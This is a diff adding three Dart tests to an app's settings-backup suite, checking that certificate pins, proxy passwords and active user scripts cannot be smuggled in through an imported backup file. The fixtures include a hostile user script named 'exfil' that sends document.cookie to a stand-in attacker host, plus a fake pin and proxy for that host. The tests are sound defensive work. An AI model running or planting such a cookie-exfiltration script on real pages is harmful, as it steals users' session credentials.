@@ -3,13 +3,16 @@ import 'dart:convert';
 import 'package:flutter_test/flutter_test.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:webspace/services/content_blocker_service.dart';
+import 'package:webspace/main.dart' show sanitizeImportedSites;
 import 'package:webspace/services/settings_backup.dart';
+import 'package:webspace/services/trusted_hosts_service.dart' show kTrustedHostsKey;
 import 'package:webspace/settings/app_prefs.dart';
 import 'package:webspace/settings/global_outbound_proxy.dart';
 import 'package:webspace/web_view_model.dart';
 import 'package:webspace/webspace_model.dart';
 import 'package:webspace/services/webview.dart';
 import 'package:webspace/settings/proxy.dart';
+import 'package:webspace/settings/user_script.dart';
 
 void main() {
   group('SettingsBackup Model', () {
@@ -849,6 +852,95 @@ void main() {
               'Ensure writeExportedAppPrefs handles its type.',
         );
       }
+    });
+
+    test('TLS cert pins never ride a backup (TLS-007)', () async {
+      // A restored pin makes `badCertificateCallback` return true and the
+      // webview PROCEED with no prompt, so a backup file must not be able
+      // to install one. `TrustedHostsService` persists the key itself.
+      expect(kExportedAppPrefs.containsKey(kTrustedHostsKey), isFalse,
+          reason: 'trust-granting state must not be in the export registry');
+
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setStringList(
+          kTrustedHostsKey, <String>['evil.example|443|deadbeefpin']);
+      final backup = SettingsBackupService.createBackup(
+        webViewModels: [],
+        webspaces: [Webspace.all()],
+        themeMode: 0,
+        globalPrefs: readExportedAppPrefs(prefs),
+      );
+      expect(backup.globalPrefs.containsKey(kTrustedHostsKey), isFalse);
+      expect(
+        SettingsBackupService.exportToJson(backup).contains('deadbeefpin'),
+        isFalse,
+        reason: 'cert pin leaked into exported JSON',
+      );
+
+      // A hand-crafted backup naming the key must not install it either.
+      SharedPreferences.setMockInitialValues({});
+      final freshPrefs = await SharedPreferences.getInstance();
+      await writeExportedAppPrefs(freshPrefs, <String, Object?>{
+        kTrustedHostsKey: <String>['evil.example|443|deadbeefpin'],
+      });
+      expect(freshPrefs.getStringList(kTrustedHostsKey), isNull);
+    });
+
+    test('a proxy password cannot ride an import (PWD-005)', () {
+      // Exports are password-less by contract, so a password in a backup
+      // file was hand-written — restoring it would point the site at
+      // someone else's authenticated proxy.
+      final siteJson = WebViewModel(
+        initUrl: 'https://a.com',
+        proxySettings: UserProxySettings(
+          type: ProxyType.SOCKS5,
+          address: 'attacker.example:1080',
+          username: 'u',
+        ),
+      ).toJson();
+      (siteJson['proxySettings'] as Map<String, dynamic>)['password'] =
+          'import-needle-9c2b';
+      final hostile = SettingsBackup(
+        version: 1,
+        sites: [siteJson],
+        webspaces: const [],
+        themeMode: 0,
+        exportedAt: DateTime(2026, 1, 1),
+      );
+
+      final restored = SettingsBackupService.restoreSites(hostile, null);
+      sanitizeImportedSites(restored);
+      expect(restored.single.proxySettings.password, isNull);
+      expect(restored.single.proxySettings.address,
+          equals('attacker.example:1080'));
+    });
+
+    test('imported user scripts are restored switched off', () {
+      final siteJson = WebViewModel(
+        initUrl: 'https://a.com',
+        userScripts: [
+          UserScriptConfig(
+            id: 's1',
+            name: 'exfil',
+            source: 'fetch("https://attacker.example/" + document.cookie)',
+          ),
+        ],
+        enabledGlobalScriptIds: {'g1'},
+      ).toJson();
+      final hostile = SettingsBackup(
+        version: 1,
+        sites: [siteJson],
+        webspaces: const [],
+        themeMode: 0,
+        exportedAt: DateTime(2026, 1, 1),
+      );
+
+      final restored = SettingsBackupService.restoreSites(hostile, null);
+      sanitizeImportedSites(restored);
+      expect(restored.single.userScripts.single.enabled, isFalse);
+      // Global scripts inject on per-site opt-in regardless of their own
+      // `enabled` flag, so the opt-in set is what has to be dropped.
+      expect(restored.single.enabledGlobalScriptIds, isEmpty);
     });
 
     test('round-trips through JSON string without loss', () async {
